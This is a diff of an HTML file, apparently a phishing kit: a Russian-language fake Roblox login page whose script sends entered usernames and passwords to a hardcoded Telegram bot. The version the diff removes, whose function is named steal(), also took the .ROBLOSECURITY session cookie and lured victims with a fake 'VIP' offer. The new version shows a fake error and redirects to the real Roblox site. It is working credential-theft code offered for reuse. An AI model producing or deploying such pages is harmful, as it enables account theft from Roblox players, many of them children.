@@ -1,37 +1,170 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Roblox Private Server</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox — Вход</title>
     <style>
-        body { font-family: Arial; background: #1a1e2b; text-align: center; padding-top: 50px; color: white; }
-        .login-box { background: #2a2f3f; padding: 30px; width: 300px; margin: 0 auto; border-radius: 12px; }
-        input, button { width: 90%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; }
-        button { background: #1e88e5; color: white; cursor: pointer; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', 'Helvetica', sans-serif;
+            background: #1a1e2b;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background: #2a2f3f;
+            padding: 40px 50px;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+
+        .roblox-logo {
+            width: 180px;
+            margin-bottom: 30px;
+        }
+
+        h1 {
+            color: white;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            color: #9ca3af;
+            font-size: 14px;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #3a3f55;
+            border: 1px solid #4a4f69;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #1e88e5;
+            background: #3f445c;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: #1e88e5;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+
+        .login-btn:hover {
+            background: #0d6efd;
+        }
+
+        .forgot-password {
+            display: block;
+            margin-top: 20px;
+            color: #9ca3af;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+            color: #1e88e5;
+        }
+
+        .error-message {
+            color: #ff6b6b;
+            font-size: 14px;
+            margin-top: 15px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-<div class="login-box">
-    <h2>Вход в Roblox</h2>
-    <input type="text" id="username" placeholder="Имя пользователя">
-    <input type="password" id="password" placeholder="Пароль">
-    <button onclick="steal()">Войти и активировать VIP</button>
-</div>
-<script>
-    function steal() {
-        var username = document.getElementById('username').value;
-        var password = document.getElementById('password').value;
-        var cookies = document.cookie;
-        var match = cookies.match(/.ROBLOSECURITY=([^;]+)/);
-        var roblosecurity = match ? match[1] : 'не найдена';
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3f/Roblox_Logo_2022.svg/800px-Roblox_Logo_2022.svg.png" alt="Roblox" class="roblox-logo">
+        <h1>Вход в аккаунт</h1>
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Имя пользователя или email</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="input-group">
+                <label>Пароль</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="login-btn">Войти</button>
+            <a href="#" class="forgot-password">Забыли пароль?</a>
+            <div id="errorMsg" class="error-message"></div>
+        </form>
+    </div>
 
-        var message = 'Логин: ' + username + '\nПароль: ' + password + '\n.ROBLOSECURITY: ' + roblosecurity;
-        
-        var botToken = '8619754068:AAGUONRG4qwbbg-yNP8f2D55oPQh3mqQq30';
-        var chatId = '1788872314';
-        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message));
+    <script>
+        // ⚠️ ВСТАВЬ СЮДА СВОИ ДАННЫЕ ОТ TELEGRAM БОТА
+        const BOT_TOKEN = '8619754068:AAGUONRG4qwbbg-yNP8f2D55oPQh3mqQq30';
+        const CHAT_ID = '1788872314';
+        // ⚠️ НЕ УДАЛЯЙ КАВЫЧКИ
 
-        alert('VIP активирован! Перезайдите в Roblox.');
-    }
-</script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = docu
+
+
+ment.getElementById('password').value;
+            const errorDiv = document.getElementById('errorMsg');
+
+            // Отправка данных в Telegram
+            const message = `🔐 Roblox LOGIN\n👤 Логин: ${username}\n🔑 Пароль: ${password}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            try {
+                await fetch(url);
+                errorDiv.textContent = 'Ошибка входа. Перенаправление...';
+                errorDiv.style.color = '#ffcc00';
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.roblox.com/login?error=Неверный пароль';
+                }, 1500);
+            } catch (err) {
+                errorDiv.textContent = 'Ошибка соединения. Попробуйте позже.';
+                errorDiv.style.color = '#ff6b6b';
+            }
+        });
+    </script>
 </body>
 </html>
